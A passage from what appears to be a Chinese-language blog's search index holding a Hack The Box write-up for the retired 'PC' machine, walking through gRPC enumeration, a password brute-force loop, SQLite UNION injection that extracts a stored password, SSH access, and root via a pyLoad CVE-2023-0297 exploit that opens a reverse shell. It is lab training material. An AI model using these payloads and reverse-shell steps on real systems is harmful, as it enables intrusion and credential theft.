'TypeError'&gt;: 'NoneType' object is not subscriptable\n</code></pre></p> <p>\u5c1d\u8bd5\u4e86\u6bd4\u5982token\u5b57\u7b26\u4e32\u524d\u9762\u52a0\u201cBearer\u201d\u6216\u8005\u201cBasic\u201d\uff0c\u7136\u540e\u7528\u7528\u4e0d\u540c\u7684option\uff0c\u6bd4\u5982-rpc-header\u3002\u7b80\u76f4\u5c31\u662f\u53d1\u6325\u60f3\u8c61\u529b\u5404\u79cd\u80e1\u4e71\u7ec4\u5408\u2026\u2026\u7ed3\u679c\u90fd\u662f\u62a5\u8fd9\u4e2a\u9519\u3002</p> <p>\u7531\u4e8e\u8c37\u6b4c\u4e5f\u4e00\u76f4\u6ca1\u641c\u51fa\u4e2a\u6240\u4ee5\u7136\u6765\uff0c\u4e8e\u662f\u5e72\u8106\u5c06\u8fd9\u6bb5\u4e22\u7ed9chatgpt\u3002 \u7136\u540e\u4f3c\u4e4e\u8fd9\u4e2a\u62a5\u9519\u4e0d\u662f\u56e0\u4e3a\u6211\u7684\u8bf7\u6c42\u6709\u8bed\u6cd5\u9519\u8bef\uff0c\u800c\u662f\u56e0\u4e3a\u54cd\u5e94\u6ca1\u6709\u503c\uff1a</p> <p>The error message you received indicates that an unexpected error occurred while executing the gRPC request. Specifically, it mentions a TypeError stating that a 'NoneType' object is not subscriptable. This error typically occurs when you attempt to access or index an element of a variable that is None (i.e., it has no value).</p> <p>\u4e8e\u662f\u6211\u5c31\u5c1d\u8bd5\u8bf7\u6c42\u5176\u4ed6id\u800c\u4e0d\u662f\u6211\u767b\u9646\u4e4b\u540e\u670d\u52a1\u5668\u7ed9\u6211\u7684\u90a3\u4e2a\u503c\uff0c\u9996\u5148\u5f53\u7136\u662f\u6700\u6709\u53ef\u80fd\u662fadmin\u7684\u201c1\u201d\uff1a <pre><code>\u2514\u2500$ ./grpcurl -vv -plaintext -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdDEiLCJleHAiOjE2ODQ4MTQ5Mzl9.qp1J8frK9Hdn6_i0Q00uLTG9Y77omoCfGqwalRZRiyw' -d '{\"id\":\"1\"}' 10.129.40.145:50051 SimpleApp/getInfo\n\nResolved method descriptor:\nrpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );\n\nRequest metadata to send:\ntoken: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdDEiLCJleHAiOjE2ODQ4MTQ5Mzl9.qp1J8frK9Hdn6_i0Q00uLTG9Y77omoCfGqwalRZRiyw\n\nResponse headers received:\ncontent-type: application/grpc\ngrpc-accept-encoding: identity, deflate, gzip\n\nEstimated response size: 46 bytes\n\nResponse contents:\n{\n  \"message\": \"The admin is working hard to fix the issues.\"\n}\n\nResponse trailers received:\n(empty)\nSent 1 request and received 1 response\n</code></pre></p> <p>wow\uff0c\u6709\u54cd\u5e94\uff0c\u867d\u7136\u6ca1\u6709\u4ec0\u4e48\u7528\u5904\u7684\u6837\u5b50\u3002\u53c8\u8bd5\u4e86\u4e00\u4e0b\u5176\u4ed6id\u3002\u7ed3\u679c\u90fd\u8fd4\u56de\u201cNoneType\u201d\u62a5\u9519\u2026\u2026</p> <p>\u7136\u540e\u7a81\u7136\u60f3\u5230\u662f\u4e0d\u662f\u771f\u7684token\u6709\u65f6\u9650\uff0c\u6216\u8005\u8bf4\u6211\u8fd9\u4e2aaccount\u6709\u65f6\u9650\uff1f \u56e0\u4e3a\u6211\u8bb0\u5f97\u4e4b\u524d\u4e3a\u4e86\u83b7\u53d6\u4e00\u4e2a\u65b0token\u800c\u5c1d\u8bd5\u8fc7\u91cd\u590d\u767b\u9646\uff0c\u7136\u800c\u660e\u660e\u662f\u6211\u6ce8\u518c\u8fc7\u7684\u8d26\u53f7\uff0c\u4f46\u662f\u767b\u9646\u65f6\u663e\u793a\u5931\u8d25\u3002\u5f53\u65f6\u8fd8\u4e0d\u77e5\u9053\u539f\u56e0\u6765\u7740\uff0c\u4e8e\u662f\u5f00\u59cb\u9a8c\u8bc1\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#_3","title":"\u9a8c\u8bc1\uff1a\u8d26\u6237\u5b9a\u671f\u6e05\u9664","text":"<p>\u9996\u5148\u91cd\u73b0\u4e00\u4e0bLogin\u6210\u529f\u540e\u8fc7\u51e0\u5206\u949f\u518d\u6b21login\u4f1a\u5931\u8d25\u7684\u73b0\u8c61\uff1a <pre><code>\u2514\u2500$ ./grpcurl -vv -plaintext -d '{\"username\":\"test1\", \"password\":\"123456\"}' 10.129.40.145:50051 SimpleApp/LoginUser\n\nResolved method descriptor:\nrpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );\n\nRequest metadata to send:\n(empty)\n\nResponse headers received:\ncontent-type: application/grpc\ngrpc-accept-encoding: identity, deflate, gzip\n\nEstimated response size: 17 bytes\n\nResponse contents:\n{\n  \"message\": \"Your id is 174.\"\n}\n\nResponse trailers received:\ntoken: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdDEiLCJleHAiOjE2ODQ4MTgzOTZ9.0SOhGBXWGFBLMnC4NkgikFlINXPUYvicLE3GfVHu3EU'\nSent 1 request and received 1 response\n\n\n\u2514\u2500$ ./grpcurl -vv -plaintext -d '{\"username\":\"test1\", \"password\":\"123456\"}' 10.129.40.145:50051 SimpleApp/LoginUser\n\nResolved method descriptor:\nrpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );\n\nRequest metadata to send:\n(empty)\n\nResponse headers received:\ncontent-type: application/grpc\ngrpc-accept-encoding: identity, deflate, gzip\n\nEstimated response size: 20 bytes\n\nResponse contents:\n{\n  \"message\": \"Login unsuccessful\"\n}\n\nResponse trailers received:\n(empty)\nSent 1 request and received 1 response\n</code></pre></p> <p>OK\uff0c\u518d\u770b\u770b\u6ce8\u518c\u3002 \u5148\u6ce8\u518c\uff0c\u7136\u540e\u518d\u6b21\u6ce8\u518c\u4f1a\u544a\u8bc9\u6211\u7528\u6237\u5df2\u5b58\u5728\u3002\u4f46\u662f\u653e\u7f6e\u51e0\u5206\u949f\u4e4b\u540e\u518d\u6ce8\u518c\u540c\u4e00\u4e2a\u7528\u6237\u5c31\u53c8\u6210\u529f\u4e86\uff1a <pre><code>\u2514\u2500$ ./grpcurl -vv -plaintext -d '{\"username\":\"test1\", \"password\":\"123456\"}' 10.129.40.145:50051 SimpleApp/RegisterUser\n\nResolved method descriptor:\nrpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );\n\nRequest metadata to send:\n(empty)\n\nResponse headers received:\ncontent-type: application/grpc\ngrpc-accept-encoding: identity, deflate, gzip\n\nEstimated response size: 33 bytes\n\nResponse contents:\n{\n  \"message\": \"Account created for user test1!\"\n}\n\nResponse trailers received:\n(empty)\nSent 1 request and received 1 response\n\n\n\u2514\u2500$ ./grpcurl -vv -plaintext -d '{\"username\":\"test1\", \"password\":\"123456\"}' 10.129.40.145:50051 SimpleApp/RegisterUser\n\nResolved method descriptor:\nrpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );\n\nRequest metadata to send:\n(empty)\n\nResponse headers received:\ncontent-type: application/grpc\ngrpc-accept-encoding: identity, deflate, gzip\n\nEstimated response size: 23 bytes\n\nResponse contents:\n{\n  \"message\": \"User Already Exists!!\"\n}\n\nResponse trailers received:\n(empty)\nSent 1 request and received 1 response\n\n\n\u2514\u2500$ ./grpcurl -vv -plaintext -d '{\"username\":\"test1\", \"password\":\"123456\"}' 10.129.40.145:50051 SimpleApp/RegisterUser\n\nResolved method descriptor:\nrpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );\n\nRequest metadata to send:\n(empty)\n\nResponse headers received:\ncontent-type: application/grpc\ngrpc-accept-encoding: identity, deflate, gzip\n\nEstimated response size: 33 bytes\n\nResponse contents:\n{\n  \"message\": \"Account created for user test1!\"\n}\n\nResponse trailers received:\n(empty)\nSent 1 request and received 1 response\n</code></pre></p> <p>\u96be\u9053\u771f\u662f\u56e0\u4e3a\u8d26\u6237\u4f1a\u88ab\u5220\u9664\uff0c\u5bfc\u81f4\u4e4b\u540e\u8c03\u7528id\u65f6\u8fd4\u56deNoneType\uff1f \u90a3\u5c31\u8bd5\u4e00\u4e0b\u5feb\u4e00\u70b9\u6267\u884c\u547d\u4ee4\u3002 \u7ed3\u679c\uff1a <pre><code>Response contents:\n{\n  \"message\": \"Will update soon.\"\n}\n\nResponse trailers received:\n(empty)\nSent 1 request and received 1 response\n</code></pre></p> <p>\u7531\u4e8eWP\u6211\u4e00\u822c\u90fd\u662f\u8fb9\u6253\u7f16\u5199\uff0c\u4f3c\u4e4e\u56e0\u4e3a\u8fd9\u6837\u624d\u5bfc\u81f4\u6211\u8d70\u4e86\u8bb8\u591a\u5f2f\u8def\u3002\u73b0\u5728\u770b\u770b\u5982\u679c\u76f4\u63a5\u4e00\u8fde\u4e32\u5148\u6253\u4e0b\u53bb\uff0c\u5e94\u8be5\u4e0d\u4f1a\u53d1\u73b0\u8fd9\u4e2a\u95ee\u9898\u2026\u2026</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#_4","title":"\u4e00\u4e9b\u5176\u4ed6\u5c1d\u8bd5","text":"<ul> <li>\u767b\u9646\u81ea\u5df1\u6ce8\u518c\u7684\u53f7\uff0c\u7136\u540e\u679a\u4e3e/\u8bf7\u6c420-500\u7684id\u3002\u9664\u4e86\u4e4b\u524d\u53d1\u73b0\u7684id 1\u7684admin\uff0c\u4ee5\u53ca\u81ea\u5df1\u767b\u9646\u540e\u7684id\uff0c\u8bf7\u6c42\u5176\u4ed6id\u90fd\u4f1a\u8fd4\u56deNoneType</li> <li>\u4e8e\u662f\u6000\u7591\u662f\u4e0d\u662f\u8981\u66b4\u7834admin\uff0c\u4e8e\u662f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u8dd1\u4e86\u4e00\u4e0b <pre><code>\u2514\u2500$ while read PW; do echo \"password\":\"$PW\"; ./grpcurl -plaintext -d '{\"username\":\"admin\", \"password\":\"$PW\"}' 10.129.40.145:50051 SimpleApp/LoginUser | grep \"message\" | grep -v \"unsuccessful\"; done &lt; /usr/share/wordlists/rockyou.txt\n</code></pre></li> </ul> <p>\u5176\u5b9e\u5e94\u8be5\u7528 <code>-d @</code>\u2026\u2026<code>&lt;&lt;EOM</code> \u7684\u65b9\u5f0f\u5199\uff0c\u4e0d\u7136\u53c2\u6570\u4e00\u76f4\u6ca1\u4f20\u5230\u5355\u5f15\u53f7\u7684payload\u91cc\u9762\u3002 \u6240\u4ee5\u81ea\u7136\u8fd9\u4e2a\u66b4\u7834\u662f\u65e0\u7ed3\u679c\u7684\u2026\u2026\u800c\u4e14\u5176\u5b9e\u6211\u8dd1\u4e861\u4e07\u591a\u884c\u5c31\u5f00\u59cb\u865a\u4e86\uff0c\u611f\u89c9\u8981\u66b4\u7834\u8fd9\u4e48\u4e45\u5e94\u8be5\u4e0d\u662f\u8fd9\u6761\u8def\u4e5f\u5c31\u4e2d\u9014\u653e\u5f03\u4e86\u3002 \u4f46\u662f\u540e\u6765\u4ee5\u4e3a\u662fgrpcurl\u4e0d\u884c\uff0c\u5c31\u6362\u4e86postman\u8fdb\u884c\u6d4b\u8bd5\u3002\u672c\u6765\u53ea\u662f\u60f3\u770b\u770bpostman\u80fd\u4e0d\u80fd\u8fd0\u884c\uff0c\u4e8e\u662f\u968f\u624b\u8d26\u6237\u5bc6\u7801\u90fd\u7528\u4e86\u201cadmin\u201d\uff0c\u7ed3\u679c\u7adf\u7136\u767b\u9646\u6210\u529f\u2026\u2026</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#grpcadmin","title":"grpc\u767b\u9646\u7684admin\u8d26\u6237","text":"<p>\u5982\u4e0a\u6240\u8ff0\uff0c\u610f\u5916\u4e4b\u559c\u5076\u7136\u53d1\u73b0admin\u7684\u5bc6\u7801\u2026\u2026</p> <p>\u672c\u6765\u4ee5\u4e3aadmin\u8d26\u6237\u7684\u8bdd\u80fd\u901a\u8fc7 <code>getInfo</code> \u5f97\u5230\u4ec0\u4e48\u654f\u611f\u4fe1\u606f\uff0c\u8fd0\u884c\u4e86\u4e00\u4e0b\u547d\u4ee4\u4e4b\u540e\u53d1\u73b0\u8fd4\u56de\u7684\u4fe1\u606f\u548c\u4ee5\u524d\u4e00\u6837\u2026\u2026\u4e8e\u662f\u53c8\u5f00\u59cb\u8ff7\u832b\u4e86\u2026\u2026</p> <p>\u5148\u5206\u4eab\u4e00\u4e0b\u8fd9\u4e2a\u811a\u672c\uff0c\u56e0\u4e3a\u603b\u662f\u8981\u767b\u9646\u83b7\u53d6token\u7136\u540e\u518d\u8c03\u7528getInfo\u3002\u6253\u5b57\u5f88\u9ebb\u70e6\u6240\u4ee5\u5199\u4e86\u8fd9\u4e2a\u811a\u672c\u65b9\u4fbf\u76f4\u63a5\u83b7\u53d6\u547d\u4ee4\uff1a <pre><code>#!/usr/bin/bash\n\nset -u\n\nHTB_IP=$1\n\n#./grpcurl -vv -plaintext -d '{\"username\":\"test123\", \"password\":\"123456\"}' ${HTB_IP}:50051 SimpleApp/RegisterUser\nLogin=$(./grpcurl -vv -plaintext -d '{\"username\":\"admin\", \"password\":\"admin\"}' ${HTB_IP}:50051 SimpleApp/LoginUser)\nmyID=$(echo ${Login}  | cut -d \"\\\"\" -f4 | cut -d \" \" -f4 | cut -d \".\" -f1)\ntoken=$(echo ${Login} | cut -d \"'\" -f2)\n\necho $Login\necho \"ID\" $myID\necho \"TOKEN\" $token\n\necho \"The request you want:\"\necho \"./grpcurl -vv -plaintext -H 'token: ${token}' -d '{\\\"id\\\":\\\"${myID}\\\"}' ${HTB_IP}:50051 SimpleApp/getInfo\"\n</code></pre></p> <p>\u8fd0\u884c\u4e0a\u9762\u7684\u811a\u672c\u540e\uff0c\u6267\u884c\u8c03\u7528getInfo\u7684\u547d\u4ee4\uff1a <pre><code>\u2514\u2500$ ./grpcurl -vv -plaintext -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUwMDM0NzN9.R_Z6JXS49px42pQwgGdm5gj9-3-p7n9lA28aLLCVq2o' -d '{\"id\":\"70\"}' 10.10.11.214:50051 SimpleApp/getInfo\n\nResolved method descriptor:\nrpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );\n\nRequest metadata to send:\ntoken: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUwMDM0NzN9.R_Z6JXS49px42pQwgGdm5gj9-3-p7n9lA28aLLCVq2o\n\nResponse headers received:\ncontent-type: application/grpc\ngrpc-accept-encoding: identity, deflate, gzip\n\nEstimated response size: 19 bytes\n\nResponse contents:\n{\n  \"message\": \"Will update soon.\"\n}\n\nResponse trailers received:\n(empty)\nSent 1 request and received 1 response\n</code></pre></p> <p>\u8bd5\u4e86\u4e00\u4e0badmin\u767b\u9646SSH\u4e5f\u4e0d\u884c\u3002</p> <p>\u5176\u5b9e\u672c\u8eab\u8fd8\u8003\u8651\u8fc7\u662f\u5426\u8981\u5229\u7528\u201cgrpc.reflection.v1alpha.ServerReflection\u201d\uff0c\u4e0d\u8fc7\u4ecepostman\u53d1\u73b0\u6211\u80fd\u9009\u7684\u53ea\u6709\u201cSimpleApp\u201d\u3002\u5c31\u59d1\u4e14\u4e0d\u7ba1\u4e86\u3002  </p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#sqli","title":"\u53d1\u73b0SQLi","text":"<p>\u5f00\u59cb\u7422\u78e8\u8fd9\u4e2aid\u53c2\u6570\u80fd\u4e0d\u80fd\u6ce8\u5165\u5565\u7684\u3002 \u4e0b\u9762\u5f00\u59cb\u5173\u6ce8payload\uff0c\u6240\u4ee5 <code>-vv</code> \u9009\u9879\u5c31\u7701\u7565\u4e86</p> <p>\u4e00\u5f00\u59cb\u653e\u4e2a\u5355\u5f15\u53f7\u53d1\u73b0\u4e0d\u884c\u3002\u8003\u8651\u597d\u4e00\u9635\u5b50\u624d\u60f3\u8d77\u6765\u6700\u57fa\u7840\u7684\u77e5\u8bc6\uff0c\u8fd9\u53ef\u80fd\u4e0d\u662f\u5b57\u7b26\u7c7b\u578b\u800c\u662f\u6570\u5b57\u7c7b\u578b\uff1a <pre><code>\u2514\u2500$ ./grpcurl -plaintext -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUwMDM0NzN9.R_Z6JXS49px42pQwgGdm5gj9-3-p7n9lA28aLLCVq2o' -d '{\"id\":\"1\"}' 10.10.11.214:50051 SimpleApp/getInfo \n{\n  \"message\": \"The admin is working hard to fix the issues.\"\n}\n\n\u2514\u2500$ ./grpcurl -plaintext -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUwMDM0NzN9.R_Z6JXS49px42pQwgGdm5gj9-3-p7n9lA28aLLCVq2o' -d '{\"id\":\"1 or 1=1\"}' 10.10.11.214:50051 SimpleApp/getInfo\n{\n  \"message\": \"The admin is working hard to fix the issues.\"\n}\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#_5","title":"\u5224\u65ad\u5b57\u6bb5\u6570","text":"<p><code>-d '{\"id\":\"140 ORDER BY 1--\"}'</code>\uff1a\u65e0\u62a5\u9519\u30022\u5c31\u62a5\u9519\u3002\u5176\u5b9e\u5f88\u660e\u663e\u53ea\u67091\u5217\u5c31\u662f\u4e86\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#sqlite3","title":"\u5224\u65ad\u6570\u636e\u5e93\uff1asqlite3","text":"<p>\u6839\u636ehacktricks\u8fd9\u91cc\u53ea\u80fd\u5224\u65ad\u51fa\u4e0d\u662fMySQL\u3002 \u4e0d\u8fc7\u5176\u5b9e\u7528\u5206\u53f7\u5c1d\u8bd5\u6267\u884c\u591a\u6761\u547d\u4ee4\u65f6\uff0c\u53ef\u4ee5\u770b\u5230\u62a5\u9519\u4fe1\u606f\u660e\u786e\u662fsqlite3\uff1a <pre><code>\u2514\u2500$ ./grpcurl -plaintext -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUwMDM0NzN9.R_Z6JXS49px42pQwgGdm5gj9-3-p7n9lA28aLLCVq2o' -d '{\"id\":\"1 or 1=1; select * from sqlite_master\"}' 10.10.11.214:50051 SimpleApp/getInfo\nERROR:\n  Code: Unknown\n  Message: Unexpected &lt;class 'sqlite3.Warning'&gt;: You can only execute one statement at a time.\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#_6","title":"\u66b4\u5e93","text":"<p>\u786e\u8ba4\u662fsqlite3\u5c31\u597d\u529e\u4e86\uff0c\u8c37\u6b4c\u4e00\u4e0bcheatsheet\u5f00\u59cb\u66b4\u5e93\uff1a</p> <p>PayloadsAllTheThings/SQL Injection/SQLite Injection.md</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#extract-table-name","title":"Extract table name","text":"<p>\u7531\u4e8epayload\u6709\u5355\u5f15\u53f7\u6240\u4ee5\u7528 <code>-d @</code> \u7684\u65b9\u5f0f\u4f20\u9012</p> <pre><code>./grpcurl -plaintext -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUwMTA4NTh9.n3UwTncslJwqRDFHZb3mzU0bnnaDQKaaDp5mNyMrlOQ' -d @ 10.10.11.214:50051 SimpleApp/getInfo &lt;&lt;EOM \n{\"id\":\"140 union SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'\"}\nEOM\n{\n  \"message\": \"accounts\"\n}\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#extract-column-name","title":"Extract column name","text":"<pre><code>\u2514\u2500$ ./grpcurl -plaintext -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ5OTEzMDl9.OQuH_s45wDpBp6YaNlrwkX4p1CgSdQoSHSgaNt8ehzg' -d @ 10.10.11.214:50051 SimpleApp/getInfo &lt;&lt;EOM\n{\"id\":\"1 union SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='accounts'\"}  \nEOM\n{\n  \"message\": \"CREATE TABLE \\\"accounts\\\" (\\n\\tusername TEXT UNIQUE,\\n\\tpassword TEXT\\n)\"\n}\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#_7","title":"\u83b7\u53d6\u5bc6\u7801","text":"<p><code>limit 0,1</code> \u5373admin\u3002\u672c\u6765\u60f3\u5199\u4e2a\u811a\u672c\u679a\u4e3eid\uff0c\u4e0d\u8fc7\u8bd5\u4e86\u4e0b\u4f3c\u4e4e\u4e00\u5171\u5c312\u4e2a\u7528\u6237\u3002</p> <pre><code>\u2514\u2500$ ./grpcurl -plaintext -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ5OTEzMDl9.OQuH_s45wDpBp6YaNlrwkX4p1CgSdQoSHSgaNt8ehzg' -d @ 10.10.11.214:50051 SimpleApp/getInfo &lt;&lt;EOM\n{\"id\":\"1 union SELECT username ||', '|| password FROM accounts limit 1,1\"}\nEOM\n{\n  \"message\": \"sau, HereIsYourPassWord1431\"\n}\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#initial-access","title":"Initial Access","text":"<p>\u7528\u4e0a\u9762\u4ece\u6570\u636e\u5e93\u62ff\u7684\u8d26\u53f7\u5bc6\u7801\u767b\u9646ssh\u6210\u529f\uff1a <pre><code>\u2514\u2500$ ssh sau@10.10.11.214  \nThe authenticity of host '10.10.11.214 (10.10.11.214)' can't be established.\nED25519 key fingerprint is SHA256:63yHg6metJY5dfzHxDVLi4Zpucku6SuRziVLenmSmZg.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:31: [hashed name]\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes \nWarning: Permanently added '10.10.11.214' (ED25519) to the list of known hosts.\nsau@10.10.11.214's password: \nLast login: Thu May 25 03:06:26 2023 from 10.xx.xx.xx\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#flag-user","title":"flag: user","text":"<pre><code>sau@pc:~$ pwd\n/home/sau\nsau@pc:~$ ls\nsnap  user.txt\nsau@pc:~$ cat user.txt \n4eef\u2026\u2026\u2026\u20260835\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#_8","title":"\u63a2\u7d22","text":"<ul> <li>\u65e0\u53ef\u6267\u884csudo</li> <li>crontab\u65e0\u53d1\u73b0</li> <li>SUID\u65e0\u53d1\u73b0</li> <li>\u5bb6\u76ee\u5f55\u65e0\u7279\u6b8a\u9690\u85cf\u6587\u4ef6</li> <li>hosts\u6587\u4ef6\u65e0\u53d1\u73b0</li> <li>\u770b\u4e3b\u673aIP\uff0c\u65e0\u591a\u4e2a\u7f51\u5361</li> <li>\u67e5\u770b\u672c\u5730\u5f00\u653e\u7aef\u53e3\u3002\u6ce8\u610f\u5230\u670953/8000/9666</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#8000pyload","title":"\u672c\u5730\u7aef\u53e38000\uff1apyLoad","text":"<p>8000\u548c9666\u90fd\u662f\u540c\u6837\u7684\u7ed3\u679c\uff1a <pre><code>sau@pc:~$ curl 127.0.0.1:8000\n&lt;!doctype html&gt;\n&lt;html lang=en&gt;\n&lt;title&gt;Redirecting...&lt;/title&gt;\n&lt;h1&gt;Redirecting...&lt;/h1&gt;\n&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=\"/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F\"&gt;/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F&lt;/a&gt;. If not, click the link.\n</code></pre></p> <p>\u5c06\u54cd\u5e94\u4e2d\u7684\u94fe\u63a5\u89e3\u7801\uff1a/login?next=http://127.0.0.1:8000/</p> <p>\u7136\u540e\u518d\u6b21curl\u770b\u770b\uff0c\u8fd4\u56de\u4e00\u4e2a\u7f51\u9875\u6e90\u7801\uff1a <pre><code>sau@pc:~$ curl 127.0.0.1:8000/login?next=http://127.0.0.1:8000/\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\u2026\u2026\n&lt;title&gt;Login - pyLoad &lt;/title&gt;\n\u2026\u2026\n</code></pre></p> <p>\u770btitle\u6ce8\u610f\u5230\u662f\u4e2apyLoad\u7684\u767b\u9646\u754c\u9762\u3002</p> <p>\u672c\u6765\u8fd8\u5f04\u4e86\u4e2aSSH\u96a7\u9053\uff0c\u8bbf\u95ee\u4e86\u4e00\u4e0bpyLoad\u7f51\u9875\u3002 \u5c1d\u8bd5\u4e86\u4e00\u4e0b\u9ed8\u8ba4\u51ed\u636e\u767b\u9646\u3001SQLi\uff0c\u6ca1\u4ec0\u4e48\u8fdb\u5c55\u3002</p> <p></p> <p>\u7136\u540e\u53d1\u73b0\u539f\u6765\u6709gitlab\u9879\u76ee\uff0c\u80fd\u8fd0\u884c\u547d\u4ee4\u3002 <pre><code>sau@pc:~$ which pyload\n/usr/local/bin/pyload\nsau@pc:~$ pyload --version\npyLoad 0.5.0\n</code></pre></p> <p>\u77e5\u9053\u7248\u672c\uff0c\u5c31\u641c\u4e86\u4e0b\u662f\u5426\u6709\u516c\u5f00\u6f0f\u6d1e\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#privilege-escalation","title":"Privilege Escalation","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#poc-cve-2023-0297","title":"PoC (CVE-2023-0297)","text":"<ul> <li>NVD</li> <li>Exp</li> </ul> <p>NVD\u91cc\u6709\u4e2aexp\u7684\u94fe\u63a5\uff0c\u8bd5\u4e86\u4e0b\u867d\u7136\u786e\u5b9e\u53ef\u4ee5\u521b\u5efa <code>/tmp/pwnd</code>\uff0c\u4e0d\u8fc7\u60f3\u7ed9bash\u52a0SUID\u6216\u8005\u6267\u884c\u53cd\u5f39shell\u547d\u4ee4\u5c31\u6ca1\u7528\u2026\u2026\u4e0d\u61c2\u4e3a\u4ec0\u4e48\u3002 \u7ed3\u679c\u8fd8\u662f\u6839\u636e\u91cc\u9762\u5199\u7684CVE\u53f7\u7801\u7ee7\u7eed\u641c\u4e86\u641c\u5176\u4ed6Exp\uff0c\u5c31\u627e\u5230\u4e0a\u9762\u90a3\u4e2aExp\uff0c\u8fd0\u884c\u540e\u6210\u529fget shell\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#flag-root","title":"flag: root","text":"<pre><code>\u2514\u2500$ python exp.py -t 127.0.0.1:8000 -c id -I 10.xx.xx.xx -P 81\n[SUCCESS] Running reverse shell. Check your listener!\n\n---\n\n\u2514\u2500$ nc -lvnp 81                  \nlistening on [any] 81 ...\nconnect to [10.xx.xx.xx] from (UNKNOWN) [10.10.11.214] 48940\nbash: cannot set terminal process group (1040): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@pc:~/.pyload/data# id\nid\nuid=0(root) gid=0(root) groups=0(root)\nroot@pc:~/.pyload/data# ls\nls\ndb.version\npyload.db\nroot@pc:~/.pyload/data# cat /root/root.txt\ncat /root/root.txt\nbec6\u2026\u2026\u2026\u20267110\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-PC/#_9","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2023/05/25 \u2026\u2026</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/","title":"HTB-Pilgrimage","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#summary","title":"Summary","text":"<p>...</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#attack-path-overview","title":"Attack Path Overview","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#_1","title":"\u626b\u63cf","text":"<p>\u81ea\u7528\u626b\u63cf\u811a\u672c\uff1a\u5de5\u4f5c\u6d41</p> <p>\u5f00\u653e\u7aef\u53e3\uff1a <pre><code>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n80/tcp open  http    nginx 